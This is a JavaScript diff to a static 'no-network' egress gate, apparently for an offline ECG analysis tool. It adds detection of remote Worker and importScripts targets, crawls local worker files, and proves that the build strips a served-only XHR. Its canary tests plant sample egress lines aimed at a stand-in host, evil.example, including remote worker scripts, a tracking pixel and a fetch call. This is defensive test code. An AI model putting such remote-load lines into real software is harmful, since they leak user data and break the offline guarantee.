@@ -171,9 +171,57 @@ function firstLiteralArg(argText){
   return m ? m[2] : null;
 }
 
+/* ── The WORKER lens (row 2026-11-08-the-no-network-crawl-never-follows-a-worker-target).
+   A worker URL is an ARGUMENT, not a `src=`, so RESOURCE_REMOTE cannot see it: a remote
+   `new Worker("https://…")` or `importScripts("https://…")` passed every lens above. And a
+   LOCAL literal is a crawl EDGE — the file it names is a shipped surface this page loads and
+   runs, which the module crawl never followed, so the runtime trap (main-thread only) never
+   covered it either. Both halves live here. ── */
+const WORKER_CALL = /\b(new\s+(?:Shared)?Worker|importScripts)\s*\(/g;
+/* every string literal up to the call's own closing paren — `importScripts` takes many */
+function literalArgs(text, from){
+  const out=[]; const re=/(['"`])((?:\\.|(?!\1)[^\\])*)\1/g;
+  let depth=0, end=text.length;
+  for(let i=from;i<text.length;i++){
+    const c=text[i];
+    if(c==='(') depth++;
+    else if(c===')'){ if(depth===0){ end=i; break; } depth--; }
+  }
+  const scope=text.slice(from, end);
+  let m; while((m=re.exec(scope))) out.push(m[2]);
+  return out;
+}
+/* a crawl edge is a local .js the origin can serve; blob:, data: and a dynamic arg are not */
+function isCrawlableScript(u){ return /^[^?#:]+\.m?js(\?|$)/i.test(String(u||'')); }
+/* resolve a worker/importScripts target against its REFERRER's directory, not the page's */
+function resolveFrom(referrer, rel){
+  if(/^\//.test(rel)) return rel.replace(/^\/+/,'');
+  const dir = String(referrer).replace(/[^/]*$/, '');
+  const out=[];
+  for(const seg of (dir + rel).split('/')){
+    if(seg==='' || seg==='.') continue;
+    if(seg==='..'){ out.pop(); continue; }
+    out.push(seg);
+  }
+  return out.join('/');
+}
+
 function scanText(text, label){
-  const out = { remote:[], transport:[], external:[], local:[] };
+  const out = { remote:[], transport:[], external:[], local:[], workers:[], stripped:[] };
   const lines = text.split(/\r?\n/);
+  /* The five analysis workers load a repo module with a SYNCHRONOUS XHR, because a worker cannot
+     import an ESM module and `importScripts` is a no-op stub in the built blob. Each such loader
+     sits inside a `@blob-strip` region, which `build-analysis.mjs:138` replaces with `throw e;`
+     when it inlines the worker into a built page. So the primitive is served-only: present in the
+     repo copy this gate reads, absent from the shipped artifact. A hit there goes to `stripped`
+     and the build is PROVED to remove it below — the comment is never taken on trust. */
+  const stripRanges = [];
+  { const sr = /\/\* @blob-strip:start[\s\S]*?@blob-strip:end \*\//g; let sm;
+    while((sm = sr.exec(text))){
+      const a = text.slice(0, sm.index).split(/\r?\n/).length;
+      stripRanges.push([a, a + sm[0].split(/\r?\n/).length - 1]);
+    } }
+  const inStrip = (ln) => stripRanges.some(r => ln>=r[0] && ln<=r[1]);
   for(let i=0;i<lines.length;i++){
     const line = lines[i];
     const ln = i+1;
@@ -188,8 +236,10 @@ function scanText(text, label){
       else if(isRemoteURL(lit)){ push(out.remote, kind, lit); }
       else { push(out.local, kind, lit || '(empty)'); }
     }
-    // (b) transport-only primitives — no local-asset use in an offline analyzer
-    if(TRANSPORT.test(line)) push(out.transport, 'transport', (line.match(TRANSPORT)||[''])[0]);
+    // (b) transport-only primitives — no local-asset use in an offline analyzer. A hit inside a
+    //     `@blob-strip` region is served-only (see the note above); a REMOTE URL is never laundered
+    //     by the region, because lenses (a), (d) and (e) classify it by target and ignore the region.
+    if(TRANSPORT.test(line)) push(inStrip(ln) ? out.stripped : out.transport, 'transport', (line.match(TRANSPORT)||[''])[0]);
     // (c) remote <a href> = navigation (NOT egress) — classify first so it isn't counted as a resource
     if(ANCHOR_REMOTE.test(line)){ push(out.external, 'a-href', (line.match(ANCHOR_REMOTE)||[])[1]||''); }
     // (c2) advisory <link rel="canonical|alternate|sitemap|prev|next"> — a metadata hint the browser NEVER fetches → not egress, not a resource load
@@ -200,6 +250,17 @@ function scanText(text, label){
     let cm;
     if((cm = CSS_IMPORT_REMOTE.exec(line))) push(out.remote, '@import', cm[1]);
     if((cm = CSS_URL_REMOTE.exec(line)))    push(out.remote, 'css url()', cm[1]);
+    // (f) worker constructor / importScripts — remote target = egress, local literal = crawl edge
+    let wm; WORKER_CALL.lastIndex = 0;
+    while((wm = WORKER_CALL.exec(line))){
+      const kind = /importScripts/.test(wm[1]) ? 'importScripts' : 'new Worker';
+      const lits = literalArgs(line, WORKER_CALL.lastIndex);
+      if(!lits.length){ push(out.local, kind, '(dynamic arg)'); continue; }
+      for(const lit of lits){
+        if(isRemoteURL(lit)){ push(out.remote, kind, lit); }
+        else { push(out.local, kind, lit); out.workers.push(lit); }
+      }
+    }
   }
   return out;
 }
@@ -368,26 +429,64 @@ function localScriptSrcs(html){
   const staticTb = document.querySelector('#staticTbl tbody');
   const detailWrap = document.getElementById('staticDetail');
   const moduleCache = {};   // path → scan (dedupe shared modules across orchestrators)
+  const workerFiles = {};   // worker/importScripts target → the file that named it
+  const workerUnreadable = [];   // a .js worker target this origin does not serve = the gate could not look
   let staticRemoteTotal=0, staticScanned=0, staticMissing=0, externalTotal=0;
   const remoteHits=[];
+  const strippedHits={};        // "label:line" → hit, deduped across the pages that share a module
+  const stripProofFail=[];      // a built page that embeds a worker and does NOT prove the strip ran
   for(const pg of STATIC_PAGES){
     const html = await fetchText(pg.name);
     if(html==null){ staticMissing++; elRow(staticTb,['<td>'+esc(pg.name)+'</td>','<td class="mut">'+pg.kind+'</td>','<td>'+pill('warn','not served — skipped')+'</td>','<td class="mut">—</td>','<td class="mut">—</td>']); continue; }
     staticScanned++;
+    /* POSITIVE CONTROL for the `stripped` bucket: a built page that embeds a worker (`__WSRC`)
+       must carry build-analysis.mjs's replacement text, and must carry no surviving region. The
+       absence of a transport primitive alone would pass vacuously on a page that embeds nothing. */
+    if(/__WSRC/.test(html) && !/served-only co-load fallback stripped/.test(html))
+      stripProofFail.push({ page:pg.name, why:'embeds a worker and carries no strip sentinel' });
+    if(/@blob-strip:start/.test(html))
+      stripProofFail.push({ page:pg.name, why:'a @blob-strip region survived the build' });
     const hs = scanText(html, pg.name);
+    hs.stripped.forEach(h=>{ strippedHits[h.label+':'+h.line] = h; });
     let remote = hs.remote.concat(hs.transport);
     let ext = hs.external.slice();
     let localN = hs.local.length;
     let modNames = [];
-    if(!pg.selfContained){
-      for(const mod of localScriptSrcs(html)){
-        modNames.push(mod);
-        if(!(mod in moduleCache)){
-          const mtxt = await fetchText(mod);
-          moduleCache[mod] = mtxt==null ? null : scanText(mtxt, mod);
-        }
-        const ms = moduleCache[mod];
-        if(ms){ remote = remote.concat(ms.remote, ms.transport); ext = ext.concat(ms.external); localN += ms.local.length; }
+    /* A BREADTH-FIRST crawl, because a worker target is reachable only through the file that
+       names it. Seeds: the loose <script src> modules of an unbundled page, PLUS every worker
+       target the page's OWN text names — a self-contained bundle inlines its modules and still
+       loads a loose worker FILE, so `selfContained` may not skip this half. Each file is scanned
+       once across the whole run (`moduleCache`), and its own worker targets are enqueued, so an
+       importScripts chain inside a worker is followed to its end. */
+    const queue = [];
+    const enqueueWorkers = (scan, referrer) => {
+      if(!scan) return;
+      for(const w of scan.workers){
+        if(!isCrawlableScript(w)) continue;              // blob:/data:/dynamic — not fetchable
+        const path = resolveFrom(referrer, w);
+        queue.push({ path, worker:true, via:referrer });
+      }
+    };
+    if(!pg.selfContained) for(const mod of localScriptSrcs(html)) queue.push({ path:mod, worker:false, via:pg.name });
+    enqueueWorkers(hs, pg.name);
+    const seenHere = Object.create(null);
+    while(queue.length){
+      const item = queue.shift();
+      const mod = item.path;
+      if(item.worker) workerFiles[mod] = (workerFiles[mod] || item.via);
+      if(seenHere[mod]) continue;
+      seenHere[mod] = true;
+      modNames.push(mod + (item.worker ? ' (worker)' : ''));
+      if(!(mod in moduleCache)){
+        const mtxt = await fetchText(mod);
+        moduleCache[mod] = mtxt==null ? null : scanText(mtxt, mod);
+        if(mtxt==null && item.worker) workerUnreadable.push({ path:mod, via:item.via });
+      }
+      const ms = moduleCache[mod];
+      if(ms){
+        remote = remote.concat(ms.remote, ms.transport); ext = ext.concat(ms.external); localN += ms.local.length;
+        ms.stripped.forEach(h=>{ strippedHits[h.label+':'+h.line] = h; });
+        enqueueWorkers(ms, mod);
       }
     }
     staticRemoteTotal += remote.length;
@@ -407,10 +506,16 @@ function localScriptSrcs(html){
     html+='</tbody></table>'; detailWrap.innerHTML=html;
   }
   const uniqueModules = Object.keys(moduleCache).length;
-  const staticOK = staticRemoteTotal===0 && staticScanned>0 && bundleListError===null;
+  const workerCount = Object.keys(workerFiles).length;
+  /* FAIL-CLOSED on a worker target the origin does not serve: the crawl found the edge and could
+     not read the file, which is "examined nothing" and never a pass (CLAUDE.md §4b). */
+  const strippedCount = Object.keys(strippedHits).length;
+  const staticOK = staticRemoteTotal===0 && staticScanned>0 && bundleListError===null
+    && workerUnreadable.length===0 && stripProofFail.length===0;
   document.getElementById('staticSummary').innerHTML =
-    (staticOK ? pill('ok','✓ no remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s)')
-              : pill('bad','✗ '+staticRemoteTotal+' remote-egress hit(s)'))
+    (staticOK ? pill('ok','✓ no remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s), '+workerCount+' of them worker target(s)')
+              : pill('bad','✗ '+staticRemoteTotal+' remote-egress hit(s)'+(workerUnreadable.length? ' · '+workerUnreadable.length+' unreadable worker target(s)':'')+(stripProofFail.length? ' · '+stripProofFail.length+' unproved strip region(s)':'')))
+    + (strippedCount? ' '+pill('mut', strippedCount+' served-only transport primitive(s) in @blob-strip regions — stripped from the shipped blob, proved on '+ANALYSIS_PAGES.length+' page(s)') : '')
     + (staticMissing? ' '+pill('warn', staticMissing+' not served — skipped') : '')
     + (externalTotal? ' '+pill('mut', externalTotal+' external <a> link(s) — navigation, not egress') : '')
     + ' <span class="det">local/dynamic same-origin loads allowed by design.</span>';
@@ -488,7 +593,10 @@ function localScriptSrcs(html){
     { lens: 'JS .src=',       line: 'img.src = "https://evil.example/pixel.gif";',                  bucket: 'remote',    kind: 'resource' },
     { lens: '<script src>',   line: '<script src="https://cdn.evil.example/track.js"><\/script>',  bucket: 'remote',    kind: 'resource' },
     { lens: '@import',        line: '@import url("https://fonts.evil.example/f.css");',             bucket: 'remote',    kind: '@import' },
-    { lens: 'CSS url()',      line: '.x{ background:url("https://evil.example/bg.png") }',          bucket: 'remote',    kind: 'css url()' }
+    { lens: 'CSS url()',      line: '.x{ background:url("https://evil.example/bg.png") }',          bucket: 'remote',    kind: 'css url()' },
+    { lens: 'new Worker',     line: 'var w = new Worker("https://evil.example/w.js");',              bucket: 'remote',    kind: 'new Worker' },
+    { lens: 'SharedWorker',   line: 'var w = new SharedWorker("https://evil.example/s.js");',        bucket: 'remote',    kind: 'new Worker' },
+    { lens: 'importScripts',  line: 'importScripts("ecgdex-dsp.js", "https://evil.example/x.js");',  bucket: 'remote',    kind: 'importScripts' }
   ];
   for(const p of PLANTED){
     const sc = scanText(p.line, 'canary/planted');
@@ -510,6 +618,33 @@ function localScriptSrcs(html){
   const benignRemote = benignScan.remote.length + benignScan.transport.length;
   canRow('static · benign local not flagged', '0 remote hits on relative/data: loads', benignRemote===0, benignRemote+' false-positive(s)');
   canRow('static · remote <a href> = nav', 'classify external link as navigation, not egress', benignScan.external.length===1 && benignScan.remote.length===0);
+  /* The worker lens has a SECOND job the planted rows above cannot prove: a LOCAL worker target
+     must become a crawl edge, because a lens that classifies it and does not follow it leaves the
+     file unexamined. These three rows assert the edge, the dynamic-arg case and the resolver. */
+  const workerBenign = scanText("var w = new Worker('cohort-worker.js');\nimportScripts('ecgdex-dsp.js','clock.js');", 'canary/worker');
+  canRow('static · local worker target = crawl edge', '3 edges, 0 remote',
+    workerBenign.workers.length===3 && workerBenign.remote.length===0,
+    workerBenign.workers.length+' edge(s), '+workerBenign.remote.length+' remote');
+  canRow('static · dynamic worker arg is no edge', 'new Worker(URL.createObjectURL(b)) yields 0 edges',
+    scanText('var w = new Worker(URL.createObjectURL(blob));','canary/worker').workers.length===0);
+  /* The `stripped` bucket needs both directions plus the no-launder case, because a region that
+     swallowed a REMOTE url would turn the whole lens into a silencer. */
+  const STRIP_XHR = "/* @blob-strip:start\n  var xhr = new XMLHttpRequest();\n  @blob-strip:end */";
+  const stripIn = scanText(STRIP_XHR, 'canary/strip');
+  canRow('static · transport inside @blob-strip is served-only', '1 stripped, 0 transport',
+    stripIn.stripped.length===1 && stripIn.transport.length===0,
+    stripIn.stripped.length+' stripped, '+stripIn.transport.length+' transport');
+  const stripOut = scanText('  var xhr = new XMLHttpRequest();', 'canary/strip');
+  canRow('static · the same transport outside the region FAILS', '1 transport, 0 stripped',
+    stripOut.transport.length===1 && stripOut.stripped.length===0,
+    stripOut.transport.length+' transport, '+stripOut.stripped.length+' stripped');
+  const stripRemote = scanText("/* @blob-strip:start\n  fetch('https://evil.example/x');\n  @blob-strip:end */", 'canary/strip');
+  canRow('static · the region never launders a remote URL', 'fetch to a remote host still reds',
+    stripRemote.remote.length===1, stripRemote.remote.length+' remote hit(s)');
+  canRow('static · worker target resolves against its referrer', "a 'x.js' inside docs/y.js is docs/x.js",
+    resolveFrom('docs/y.js','x.js')==='docs/x.js' && resolveFrom('OverDex.html','cohort-worker.js')==='cohort-worker.js'
+    && resolveFrom('docs/y.js','../z.js')==='z.js',
+    resolveFrom('docs/y.js','x.js')+' · '+resolveFrom('docs/y.js','../z.js'));
 
   // (2) RUNTIME canary — trap must THROW on remote, ALLOW on local
   const CANARY_MODULE = `<!doctype html><html><head></head><body><script>
@@ -563,8 +698,12 @@ function localScriptSrcs(html){
     ok: window.__noNetworkOK, static: staticOK, runtime: runtimeOK, python: pythonOK, canary: canaryOK,
     staticRemoteHits: staticRemoteTotal, runtimeRemoteHits: runtimeRemoteTotal, pythonEgressHits: pyEgressTotal,
     surfacesScanned: staticScanned, looseModules: uniqueModules, surfacesBooted: runtimeBooted, pyFiles: pyScanned, externalLinks: externalTotal,
+    workerTargets: workerCount, workerUnreadable: workerUnreadable.length,
+    workerTargetList: Object.keys(workerFiles).sort(),
+    strippedTransport: strippedCount, strippedTransportList: Object.keys(strippedHits).sort(),
+    stripProofFail: stripProofFail.length, stripProofFailList: stripProofFail.slice(),
     bundleListError: bundleListError,
-    note: 'no-network gate — ok requires: 0 remote egress (static, bundles+orchestrators+loose modules) + 0 cross-origin fired (runtime) + 0 outbound python client (static lens) + canary passed + bundle list verified (fail-closed on provenance fetch failure)'
+    note: 'no-network gate — ok requires: 0 remote egress (static, bundles+orchestrators+loose modules+worker targets, crawled transitively through new Worker/importScripts) + 0 unreadable worker target + 0 cross-origin fired (runtime) + 0 outbound python client (static lens) + canary passed + bundle list verified (fail-closed on provenance fetch failure)'
   }; };
 
   const v = document.getElementById('verdict');
@@ -573,10 +712,10 @@ function localScriptSrcs(html){
     v.innerHTML='<span class="lead">🚨</span> <b class="bad">GATE UNTRUSTWORTHY</b> — the negative control failed: a lens did not catch planted egress, so a green would be vacuous. Fix the detector first.';
   } else if(ok){
     v.style.borderColor='var(--ok)'; v.style.background='rgba(63,185,80,.08)';
-    v.innerHTML='<span class="lead">✅</span> <b class="ok">NO-NETWORK INVARIANT HOLDS</b> — 0 remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s) (static), 0 cross-origin fired ('+runtimeBooted+' booted), 0 outbound Python client ('+pyScanned+' files, static lens), and the negative control proved every lens catches planted egress. '+pill('canary','canary ✓');
+    v.innerHTML='<span class="lead">✅</span> <b class="ok">NO-NETWORK INVARIANT HOLDS</b> — 0 remote egress across '+staticScanned+' surface(s) + '+uniqueModules+' loose module(s) (static, '+workerCount+' reached through new Worker/importScripts), 0 cross-origin fired ('+runtimeBooted+' booted), 0 outbound Python client ('+pyScanned+' files, static lens), and the negative control proved every lens catches planted egress. '+pill('canary','canary ✓');
   } else {
     v.style.borderColor='var(--bad)'; v.style.background='rgba(248,81,73,.08)';
-    v.innerHTML='<span class="lead">❌</span> <b class="bad">EGRESS DETECTED</b> — '+(staticOK?'':'static: '+staticRemoteTotal+' hit(s). ')+(runtimeOK?'':'runtime: '+runtimeRemoteTotal+' blocked. ')+(pythonOK?'':'python: '+pyEgressTotal+' outbound ref(s). ')+'See the tables above.';
+    v.innerHTML='<span class="lead">❌</span> <b class="bad">EGRESS DETECTED</b> — '+(staticOK?'':'static: '+staticRemoteTotal+' hit(s)'+(workerUnreadable.length? ', '+workerUnreadable.length+' unreadable worker target(s) ('+esc(workerUnreadable.map(w=>w.path).join(', '))+')':'')+(stripProofFail.length? ', '+stripProofFail.length+' unproved @blob-strip region(s) ('+esc(stripProofFail.map(s=>s.page).join(', '))+')':'')+'. ')+(runtimeOK?'':'runtime: '+runtimeRemoteTotal+' blocked. ')+(pythonOK?'':'python: '+pyEgressTotal+' outbound ref(s). ')+'See the tables above.';
   }
 
   document.getElementById('ci').textContent =
